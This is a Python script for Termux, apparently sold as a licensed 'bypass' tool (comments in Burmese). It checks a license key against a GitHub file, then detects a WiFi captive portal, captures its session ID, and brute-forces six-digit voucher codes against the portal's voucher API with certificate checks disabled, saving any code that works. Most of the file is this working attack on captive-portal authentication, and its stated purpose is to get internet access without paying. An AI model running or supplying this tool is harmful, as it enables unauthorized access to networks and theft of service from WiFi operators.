import requests
import re
import urllib3
import time
import threading
import os
import sys
import random
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIG (အရေးကြီးဆုံးအပိုင်း)
# ===============================
# GitHub က 'Raw' ခလုတ်ကို နှိပ်ပြီး ရလာတဲ့ Link ကိုပဲ ထည့်ပါ။
GITHUB_RAW_URL = "https://raw.githubusercontent.com/tmmt6132-coder/Bypass/main/keys.txt"

# --- COLORS ---
RED = "\033[91m"; GREEN = "\033[92m"; CYAN = "\033[96m"
YELLOW = "\033[93m"; MAGENTA = "\033[95m"; RESET = "\033[0m"
B_GREEN = "\033[1;32m"; B_CYAN = "\033[1;36m"; B_RED = "\033[1;31m"

def get_system_key():
    """သင့် Termux ရဲ့ Key ကို ယူခြင်း"""
    try:
        return os.getlogin()
    except:
        return os.environ.get('USER', 'u0_a321')

# ===============================
# KEY APPROVAL SYSTEM
# ===============================
def check_approval():
    os.system('clear')
    my_key = get_system_key()
    
    print(f"{B_CYAN}╔══════════════════════════════════════════════╗")
    print(f"║        RUIIE PRO BYPASS - KEY SYSTEM         ║")
    print(f"╚══════════════════════════════════════════════╝{RESET}")
    print(f"\n[*] Your Device Key: {YELLOW}{my_key}{RESET}")
    print(f"[*] Checking Database...")

    try:
        # GitHub ဆီက Data လှမ်းယူခြင်း
        res = requests.get(GITHUB_RAW_URL, timeout=10)
        if res.status_code == 200:
            lines = res.text.strip().split('\n')
            
            for line in lines:
                if not line.strip(): continue
                
                # စာကြောင်းထဲမှာ သင့် Key (u0_a321) ပါသလား စစ်မယ်
                if my_key in line:
                    parts = line.split(':')
                    # format က admin123:2027-12-6:u0_a321 ဆိုရင် parts[1] က Date
                    expiry_str = parts[1] if len(parts) > 1 else "2030-01-01"

                    try:
                        expiry_date = datetime.strptime(expiry_str, '%Y-%m-%d')
                        if datetime.now() < expiry_date:
                            print(f"{B_GREEN}[✓] ACCESS GRANTED!{RESET}")
                            print(f"{CYAN}[i] Expiry Date: {expiry_str}{RESET}")
                            time.sleep(2)
                            return True
                        else:
                            print(f"{B_RED}[❌] KEY EXPIRED ON {expiry_str}{RESET}")
                            return False
                    except:
                        return True # Date format မှားနေရင်လည်း ပေးသုံးမယ်
            
            print(f"{B_RED}[❌] KEY NOT FOUND IN GITHUB!{RESET}")
            print(f"{YELLOW}[!] Add this key to your GitHub: {my_key}{RESET}")
            return False
        else:
            print(f"{RED}[!] GitHub Link Error (Status: {res.status_code}){RESET}")
            return False
    except Exception as e:
        print(f"{RED}[!] Connection Failed: {e}{RESET}")
        return False

# ===============================
# BRUTE FORCE ENGINE
# ===============================
def brute_force_voucher(sid, portal_host):
    print(f"\n{MAGENTA}--- Voucher Brute Force Started ---{RESET}")
    try:
        start = int(input(f"{CYAN}[?] Start Code (default 0): {RESET}") or 0)
        end = int(input(f"{CYAN}[?] End Code (default 999999): {RESET}") or 999999)
    except: start, end = 0, 999999

    api_endpoint = f"{portal_host}/api/auth/voucher/"
    
    for i in range(start, end + 1):
        code = str(i).zfill(6)
        print(f"{YELLOW}Testing: [{code}]{RESET} ...", end="\r")
        
        try:
            payload = {'accessCode': code, 'sessionId': sid, 'apiVersion': 1}
            res = requests.post(api_endpoint, json=payload, timeout=2, verify=False)
            
            if res.status_code == 200 and "success" in res.text.lower():
                print(f"\n{B_GREEN}[✓] KEY FOUND: {code}{RESET}")
                with open("codes.txt", "a") as f: f.write(f"{code}\n")
                return code
        except: continue
    return None

# ===============================
# MAIN START
# ===============================
def start_process():
    os.system('clear')
    print(f"{B_CYAN}[*] Searching for WiFi Portal...{RESET}")
    
    try:
        # Portal Detection
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        if r.status_code == 204:
            print(f"{GREEN}[!] You already have internet!{RESET}")
            return

        portal_url = r.url
        parsed = urlparse(portal_url)
        portal_host = f"{parsed.scheme}://{parsed.netloc}"
        
        # Capture SID
        res = requests.get(portal_url, verify=False)
        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
        if not sid:
            match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', res.text)
            sid = match.group(1) if match else None

        if sid:
            print(f"{GREEN}[✓] SID Captured: {sid}{RESET}")
            print(f"\n{YELLOW}1. Instant Bypass (Ping)")
            print(f"2. Voucher Brute Force")
            choice = input(f"\n{CYAN}Select Option: {RESET}")

            if choice == '2':
                brute_force_voucher(sid, portal_host)
            else:
                print(f"{MAGENTA}[*] Pulse Active. Keep Termux open...{RESET}")
                # High speed ping logic here...
                while True: time.sleep(1)
        else:
            print(f"{RED}[X] Could not find Session ID!{RESET}")
            
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")

if __name__ == "__main__":
    if check_approval():
        start_process()
    else:
        sys.exit(1)
            
